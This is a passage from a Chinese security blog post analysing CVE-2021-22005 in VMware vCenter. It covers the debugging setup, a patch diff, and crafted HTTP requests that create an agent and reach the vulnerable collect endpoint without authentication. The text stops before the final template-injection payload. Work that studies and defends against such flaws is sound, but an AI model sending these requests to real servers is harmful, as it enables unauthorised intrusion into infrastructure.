

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/ico.png">
  <link rel="icon" href="/img/ico.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="pwnull">
  <meta name="keywords" content="">
  
    <meta name="description" content="在CVE-2021-22005 刚爆出来时，testbnull师傅分析了漏洞的前半部分，但是没有给出最后的RCE方法。由于自己之前也分析过Vcenter的其他几个洞，所以当时就花了些时间看了下，最终使用getAppender()拿到变量成功完成了RCE EXP的构造。而后圈子里对该漏洞的关注度小了很多，也有些师傅陆陆续续公开了POC&amp;#x2F;EXP，索性就将我当时调试情况及后来的补充分析整理成">
  
  
  
  <title>Vmware-Vcenter漏洞追踪之CVE-2021-22005 - pwnull的自留地</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"pwnull.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>pwnull的自留地</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Vmware-Vcenter漏洞追踪之CVE-2021-22005"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-12-19 10:00" pubdate>
          2022-12-19
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          22k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          187 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Vmware-Vcenter漏洞追踪之CVE-2021-22005</h1>
            
            
              <div class="markdown-body">
                
                <blockquote>
<p>在CVE-2021-22005 刚爆出来时，testbnull师傅分析了漏洞的前半部分，但是没有给出最后的RCE方法。由于自己之前也分析过Vcenter的其他几个洞，所以当时就花了些时间看了下，最终使用getAppender()拿到变量成功完成了RCE EXP的构造。而后圈子里对该漏洞的关注度小了很多，也有些师傅陆陆续续公开了POC&#x2F;EXP，索性就将我当时调试情况及后来的补充分析整理成文一并发出来。当时分析完后感觉，如果单纯通过审计能挖出来这洞真的太强了，而使用收集流量数据+审计代码去构造数据包 难度应该会小很多。在测试过程当中断点收到了系统发的请求流量，根据这些也可以很快定位到最终的resourceItemToJsonLdMapping对象进行模板注入</p>
</blockquote>
<p><strong>PS：本文仅用于技术讨论。严禁用于任何非法用途，违者后果自负。</strong></p>
<h2 id="1、环境调试"><a href="#1、环境调试" class="headerlink" title="1、环境调试"></a>1、环境调试</h2><blockquote>
<p>复现版本：VMware VirtualCenter 6.7.0 build-17028632  linux平台 </p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/vmware-vmon/</span>svcCfgfiles/analytics.json<br><span class="hljs-string">&quot;-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006&quot;</span>,<br></code></pre></td></tr></table></figure>

<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/1.png" srcset="/img/loading.gif" lazyload>  </p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">重启服务<br>service-control <span class="hljs-attr">--restart</span> vmware-analytics<br><br>开启防火墙<br>iptables -<span class="hljs-selector-tag">I</span> OUTPUT -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">5006</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">5006</span> -j ACCEPT<br></code></pre></td></tr></table></figure>

<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/2.png" srcset="/img/loading.gif" lazyload>  </p>
<p>成功断点调试：<br><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/3.png" srcset="/img/loading.gif" lazyload>  </p>
<p>如果不行就直接上命令开启调试：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>java<span class="hljs-regexp">/jre-vmware/</span>bin<span class="hljs-regexp">/vmware-analytics.launcher -Xmx128m -XX:CompressedClassSpaceSize=64m -Xss256k -XX:ParallelGCThreads=1 -Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -Dorg.apache.catalina.startup.EXIT_ON_INIT_FAILURE=TRUE -Danalytics.logDir=/</span>var<span class="hljs-regexp">/log/</span>vmware<span class="hljs-regexp">/analytics -Danalytics.dataDir=/</span>storage<span class="hljs-regexp">/analytics -Danalytics.deploymentNodeTypeFile=/</span>etc<span class="hljs-regexp">/vmware/</span>deployment.node.type -Danalytics.buildInfoFile=<span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/.buildInfo -Danalytics.agentsDir=/</span>etc<span class="hljs-regexp">/vmware-analytics/</span>agents -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/vmware/</span>analytics -XX:ErrorFile=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/vmware/</span>analytics<span class="hljs-regexp">/java_error.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintReferenceGC -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=1024K -Xloggc:/</span>var<span class="hljs-regexp">/log/</span>vmware<span class="hljs-regexp">/analytics/</span>vmware-analytics-gc.log -Djava.security.properties=<span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/java/</span>vmware-override-java.security -Djava.ext.dirs=<span class="hljs-regexp">/usr/</span>java<span class="hljs-regexp">/jre-vmware/</span>lib<span class="hljs-regexp">/ext:/u</span>sr<span class="hljs-regexp">/java/</span>packages<span class="hljs-regexp">/lib/</span>ext:<span class="hljs-regexp">/opt/</span>vmware<span class="hljs-regexp">/jre_ext/</span> -classpath <span class="hljs-regexp">/etc/</span>vmware-analytics:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware-analytics/</span>lib<span class="hljs-regexp">/*:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware-analytics<span class="hljs-regexp">/lib:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>tomcat-embed-core-<span class="hljs-number">8.5</span>.<span class="hljs-number">56</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/tomcat-annotations-api-8.5.56.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>antlr-<span class="hljs-number">2.7</span>.<span class="hljs-number">7</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/antlr-runtime.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>aspectjrt.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/bcprov-jdk16-145.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-codec-<span class="hljs-number">1.6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-collections-3.2.2.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-collections4-<span class="hljs-number">4.1</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-compress-1.8.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-io-<span class="hljs-number">2.1</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-lang-2.6.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-lang3-<span class="hljs-number">3.4</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-logging-1.1.3.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-pool-<span class="hljs-number">1.6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/custom-rolling-file-appender-1.0.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>featureStateSwitch-<span class="hljs-number">1.0</span>.<span class="hljs-number">0</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/guava-18.0.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpasyncclient-<span class="hljs-number">4.1</span>.<span class="hljs-number">3</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/httpclient-4.5.3.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpcore-<span class="hljs-number">4.4</span>.<span class="hljs-number">6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/httpcore-nio-4.4.6.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpmime-<span class="hljs-number">4.5</span>.<span class="hljs-number">3</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/jackson-annotations-2.10.4.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>jackson-core-<span class="hljs-number">2.10</span>.<span class="hljs-number">4</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/jackson-databind-2.10.4.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>jna.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/log4j-1.2.16.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>log4j-core-<span class="hljs-number">2.8</span>.<span class="hljs-number">2</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/log4j-api-2.8.2.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>platform.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/slf4j-api-1.7.30.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>slf4j-log4j12-<span class="hljs-number">1.7</span>.<span class="hljs-number">30</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-aop-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-beans-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-context-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-core-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-expression-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-web-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-webmvc-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>velocity-<span class="hljs-number">1.7</span>.jar com.vmware.ph.phservice.service.Main ph-properties-loader.xml ph-featurestate.xml phservice.xml ph-web.xml<br></code></pre></td></tr></table></figure>

<h2 id="2、补丁分析"><a href="#2、补丁分析" class="headerlink" title="2、补丁分析"></a>2、补丁分析</h2><p>vmware在9月24日发布了<a target="_blank" rel="noopener" href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">安全通告</a>，修复了vcenter的多个漏洞，其中CVE-2021-22005 任意文件上传获得严重漏洞 9.8评分，通过描述看到，攻击者可以未授权请求443端口上传文件。且此漏洞并不影响vcenter 6.5 </p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/4.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到漏洞关键字：Analytics service、443端口访问、文件上传执行命令、不影响6.5</p>
<p>补丁文章：<a target="_blank" rel="noopener" href="https://kb.vmware.com/s/article/85717">https://kb.vmware.com/s/article/85717</a></p>
<p>对比代码：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>.<span class="hljs-number">7</span>\<span class="hljs-number">17028579</span>\vmware-analytics<br><span class="hljs-attribute">6</span>.<span class="hljs-number">7</span>\<span class="hljs-number">18485185</span>-new\vmware-analytics<br></code></pre></td></tr></table></figure>

<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/5.png" srcset="/img/loading.gif" lazyload></p>
<p><code>analytics-cloud-dataapp-server-6.7.0.jar\com\vmware\ph\phservice\cloud\dataapp\server\DataAppAgentController.class</code></p>
<p>删除了DataAppAgentController.class的collect()方法</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/6.png" srcset="/img/loading.gif" lazyload></p>
<p>查看存在漏洞的版本代码：</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/7.png" srcset="/img/loading.gif" lazyload></p>
<p>另外补丁还在实例化DataAppAgentId类时，使用isValidCollectorId及isValidCollectorInstanceId检查传入的collectorId及collectorInstanceId是否符合要求</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/8.png" srcset="/img/loading.gif" lazyload></p>
<p>com.vmware.ph.phservice.common.internal.IdFormatUtil</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/9.png" srcset="/img/loading.gif" lazyload></p>
<p>使用<code>java.util.regex.Pattern</code>对字符串进行正则匹配，不符合要求则无法实例化DataAppAgentId对象；</p>
<p>另外一段变化代码，发生在<code>analytics-push-telemetry-server-6.7.0.jar\com\vmware\ph\phservice\push\telemetry\server\AsyncTelemetryController.class</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/10.png" srcset="/img/loading.gif" lazyload></p>
<p>变化点：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">vmware-analytics\lib\sources\<span class="hljs-keyword">com</span>\vmware\ph\phservice\<span class="hljs-keyword">push</span>\telemetry\server\AsyncTelemetryController<span class="hljs-meta">#handleSendRequest()</span><br><br><span class="hljs-symbol">collectorInstanceId:</span><br>IdFormatUtil.isValidCollectorInstanceId(collectorInstanceId)  正则限制<br><br><span class="hljs-symbol">collectorId:</span><br>_collectorIdWhitelist.contains(collectorId)  白名单限制<br></code></pre></td></tr></table></figure>

<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/11.png" srcset="/img/loading.gif" lazyload></p>
<p>该漏洞的临时解决方案：</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/12.png" srcset="/img/loading.gif" lazyload></p>
<p>本文对<code>/analytics/ph/api/dataapp/agent?action=collect</code>漏洞部分进行分析，查看rhttpproxy代理关于analytics服务的路由(<code>/etc/vmware-rhttpproxy/endpoints.conf.d/analytics-proxy.conf</code>)：</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/13.png" srcset="/img/loading.gif" lazyload></p>
<p>允许&#x2F;analytics访问。其实经过测试版本vmware vcenter 6.7并不需要使用..;去访问漏洞接口的</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/14.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="3、命令执行-数据构造"><a href="#3、命令执行-数据构造" class="headerlink" title="3、命令执行 数据构造"></a>3、命令执行 数据构造</h2><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/15.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="3-1-创建agent"><a href="#3-1-创建agent" class="headerlink" title="3.1 创建agent"></a>3.1 创建agent</h3><p>补丁删除的漏洞方法是：analytics-cloud-dataapp-server-6.7.0.jar\com\vmware\ph\phservice\cloud\dataapp\server\DataAppAgentController.class#collect()</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/16.png" srcset="/img/loading.gif" lazyload></p>
<p>构造基础数据包测试</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/analytics/</span>ph<span class="hljs-regexp">/api/</span>dataapp<span class="hljs-regexp">/agent?action=collect&amp;_c=abc&amp;_i=test HTTP/</span><span class="hljs-number">1.1</span><br>...<br>Content-Type: application/json<br>X-Deployment-Secret: abc<br>Content-Length: <span class="hljs-number">65</span><br><br>&#123;<span class="hljs-string">&quot;manifestContent&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;contextData&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;objectId&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>&#125;<br></code></pre></td></tr></table></figure>



<p>122行会去调用<code>com.vmware.ph.phservice.cloud.dataapp.DefaultDataAppAgentManager#getAgent</code>获取agent</p>
<blockquote>
<p>系统会去&#x2F;etc&#x2F;vmware-analytics&#x2F;agents寻找 parameter[_c]+ header[X-Plugin-Type] + “.properties” 文件，这里我们未传入请求头X-Plugin-Type，所以会去寻找&#x2F;etc&#x2F;vmware-analytics&#x2F;agents&#x2F;abc.properties文件</p>
</blockquote>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/17.png" srcset="/img/loading.gif" lazyload></p>
<p>com.vmware.ph.phservice.cloud.dataapp.repository.FileSystemAgentRepository#get()</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/18.png" srcset="/img/loading.gif" lazyload></p>
<p>但是<code>/etc/vmware-analytics/agents/abc.properties</code>并不存在，所以会直接报“Did not find agent matching the provided parameters.”的错误</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/19.png" srcset="/img/loading.gif" lazyload></p>
<p>我们可以使用系统自带的vsphere_health.properties，但是为了多个版本的适配，我们最好选择使用<code>com.vmware.ph.phservice.cloud.dataapp.server.DataAppAgentController#create()</code>去创建一个</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/20.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/21.png" srcset="/img/loading.gif" lazyload></p>
<p>构造数据包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/analytics/ph/api/dataapp/agent?_c=abc&amp;_i=test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.196<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">X-Deployment-Secret</span><span class="hljs-punctuation">: </span>abc<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>249<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;manifestSpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;objectType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;collectionTriggerDataNeeded&quot;</span><span class="hljs-punctuation">:</span>  <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;deploymentDataNeeded&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;resultNeeded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;signalCollectionCompleted&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;localManifestPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;localPayloadPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;localObfuscationMapPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>

<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/22.png" srcset="/img/loading.gif" lazyload></p>
<p>成功创建abc.properties，然后再调用collect请求就正常了</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/23.png" srcset="/img/loading.gif" lazyload></p>
<p>网上对该漏洞的绝大多数分析文章都是直接跳到velocity模板注入部分，并没有讲述如何从0去构建一个EXP，我们还是一步一步来构造下。开始执行collect()操作的是在<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.DefaultCollectorDataAppAgent#collect()</code>. EXP分几个关键部分去讲解，依次是：创建agent、XML数据构造、Velocity模板注入</p>
<h3 id="3-2-XML数据构造"><a href="#3-2-XML数据构造" class="headerlink" title="3.2 XML数据构造"></a>3.2 XML数据构造</h3><p>解析XML调用栈：</p>
